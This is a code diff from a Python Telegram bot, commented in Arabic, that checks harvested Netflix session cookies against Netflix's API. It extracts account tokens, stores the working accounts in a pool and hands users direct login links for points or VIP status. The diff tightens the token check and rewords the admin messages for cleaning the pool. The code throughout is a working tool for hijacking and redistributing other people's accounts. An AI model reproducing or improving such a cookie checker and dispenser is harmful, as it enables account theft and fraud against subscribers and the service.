@@ -88,7 +88,7 @@ def extract_clean_netflix_ids(text):
             cleaned_ids.append(decoded)
     return cleaned_ids
 
-# 1️⃣ الفحص العادي: يقبل كل حساب شغال ولديه استجابة أو Token وينقله للمخزن فوراً دون استبعاد
+# 1️⃣ الفحص العادي: يقبل كل الحسابات التي تعمل وتملك Token ولا يحذفها
 def check_netflix_cookie_detailed(netflix_id):
     headers = dict(BASE_HEADERS)
     headers["Cookie"] = f"NetflixId={netflix_id}"
@@ -98,20 +98,21 @@ def check_netflix_cookie_detailed(netflix_id):
             data = response.json()
             value_data = data.get("value", {})
             account_info = value_data.get("account", {}).get("token", {}).get("default", {})
-            token = account_info.get("token") or "DIRECT_PASS"
+            token = account_info.get("token")
             expires = account_info.get("expires")
             
-            return {
-                "token": token, 
-                "expires": expires, 
-                "bypass": False, 
-                "is_premium": True
-            }
+            if token:
+                return {
+                    "token": token, 
+                    "expires": expires, 
+                    "bypass": False, 
+                    "is_premium": True
+                }
         return None
     except Exception:
         return None
 
-# 2️⃣ الفحص الصارم لزر التصفية السرية: يتأكد من وجود البروفايلات وحالة الاشتراك النشطة فقط
+# 2️⃣ الفحص الصارم لزر التصفية السرية: يتأكد من أن الحساب يملك بروفايلات نشطة وحقيقية وغير منتهي الاشتراك
 def check_cookie_strict_for_admin_cleaning(netflix_id):
     headers = dict(BASE_HEADERS)
     headers["Cookie"] = f"NetflixId={netflix_id}"
@@ -213,7 +214,7 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
             expires = result["expires"]
             if isinstance(expires, int) and len(str(expires)) == 13: 
                 expires //= 1000
-            date_str = datetime.fromtimestamp(expires).strftime('%d %B %Y') if expires else "Active"
+            date_str = datetime.fromtimestamp(expires).strftime('%d %B %Y') if expires else "Unknown"
             
             full_cookie_string = f"NetflixId={netflix_id}"
             direct_netflix_url = f"https://netflix.com/?nftoken={token}"
@@ -406,7 +407,7 @@ def execute_dispense_logic(chat_id):
             expires = fresh_result["expires"]
             if isinstance(expires, int) and len(str(expires)) == 13: 
                 expires //= 1000
-            date_str = datetime.fromtimestamp(expires).strftime('%d %B %Y') if expires else "Active"
+            date_str = datetime.fromtimestamp(expires).strftime('%d %B %Y') if expires else "Unknown"
             
             full_cookie_string = f"NetflixId={current_cookie}"
             direct_netflix_url = f"https://netflix.com/?nftoken={token}"
@@ -414,7 +415,7 @@ def execute_dispense_logic(chat_id):
             
             points_display = "♾️ وضع المطور" if chat_id == DEVELOPER_CHAT_ID else ("💎 وضع VIP" if role == "VIP" else f"{USER_DATABASE[chat_id]['points']} نقطة")
             success_text = (
-                f"🎉 **تفضل رابط نتفلكس الخاص بك** 🎉\n\n"
+                f"🎉 **تفضل رابط نتفلكس الطازج الخاص بك** 🎉\n\n"
                 f"🪙 رصيدك المتبقي الحالي: {points_display}.\n"
                 f"📅 **تاريخ الفواتير القادم:** {date_str}\n\n"
                 f"🔗 **رابط الدخول المباشر المؤقت:**\n{direct_netflix_url}\n\n"
@@ -554,14 +555,14 @@ def handle_user_feedback(call):
 def open_admin_panel_msg(chat_id):
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("📢 إرسال إذاعة جماعية (Broadcast)", callback_data="admin_broadcast"))
-    markup.add(InlineKeyboardButton("🧹 تصفية المخزن (حذف الاشتراكات المنتهية)", callback_data="admin_clean_pool"))
+    markup.add(InlineKeyboardButton("🧹 تنظيف المخزن وحذف التالف", callback_data="admin_clean_pool"))
     markup.add(InlineKeyboardButton("🔄 تصفير الذاكرة والمكرر", callback_data="admin_clear_history"))
     
     stats_text = (
         f"👑 **مرحباً بك يا مطور البوت (فارس) في لوحتك السرية** 👑\n\n"
         f"📊 **إحصائيات البوت اللحظية:**\n"
         f"👥 إجمالي المستخدمين المسجلين: {len(USER_DATABASE)}\n"
-        f"📦 إجمالي الحسابات بالمخزن: {len(VALID_COOKIES_POOL)}\n"
+        f"📦 إجمالي الحسابات الشغالة بالمخزن: {len(VALID_COOKIES_POOL)}\n"
         f"🚫 إجمالي المحظورين: {len(BANNED_USERS)}\n"
         f"✂️ إجمالي الكوكيز في مانع التكرار: {len(USED_COOKIES_HISTORY)}"
     )
@@ -596,14 +597,14 @@ def process_broadcast_sending(message):
             
     bot.send_message(DEVELOPER_CHAT_ID, f"✅ تمت الإذاعة بنجاح! تم تسليم الرسالة إلى {sent_count} مستخدم نشط 🚀")
 
-# 🧹 زر التصفية الدقيقة والصرامة الخاص بالمطور (اللوحة السرية)
+# --- الدالة الخاصة بفحص وتنظيف المخزن وحذف الحسابات التالفة والمتوقفة بناءً على البروفايلات النشطة ---
 @bot.callback_query_handler(func=lambda call: call.data == "admin_clean_pool")
 def clean_pool_manual_action(call):
     if call.message.chat.id != DEVELOPER_CHAT_ID:
         return
     
-    bot.answer_callback_query(call.id, "⏳ جاري فحص حسابات المخزن وتصفية الاشتراكات المنتهية...")
-    status_msg = bot.send_message(DEVELOPER_CHAT_ID, "🧹 **بدأت عملية التصفية الدقيقة للمخزن...** يرجى الانتظار.")
+    bot.answer_callback_query(call.id, "⏳ جاري فحص جميع حسابات المخزن والتأكد من بروفايلاتها النشطة...")
+    status_msg = bot.send_message(DEVELOPER_CHAT_ID, "🧹 **بدأت عملية فحص وتصفية المخزن بدقة...** يرجى الانتظار.")
     
     global VALID_COOKIES_POOL
     initial_count = len(VALID_COOKIES_POOL)
@@ -624,10 +625,10 @@ def clean_pool_manual_action(call):
     VALID_COOKIES_POOL = still_valid
     
     result_text = (
-        f"✅ **تمت تصفية المخزن بنجاح!**\n\n"
+        f"✅ **تم الانتهاء من تصفية المخزن بنجاح!**\n\n"
         f"📊 الحسابات قبل التصفية: {initial_count}\n"
-        f"👑 الحسابات الشغالة ذات البروفايلات المتاحة: {len(VALID_COOKIES_POOL)}\n"
-        f"❌ الحسابات المنتهية الاشتراك التي تم حذفها: {removed_count}"
+        f"👑 الحسابات ذات البروفايلات النشطة المتبقية: {len(VALID_COOKIES_POOL)}\n"
+        f"❌ الحسابات المتوقفة أو التي تتطلب تجديد وتم حذفها: {removed_count}"
     )
     bot.edit_message_text(result_text, DEVELOPER_CHAT_ID, status_msg.message_id)
 
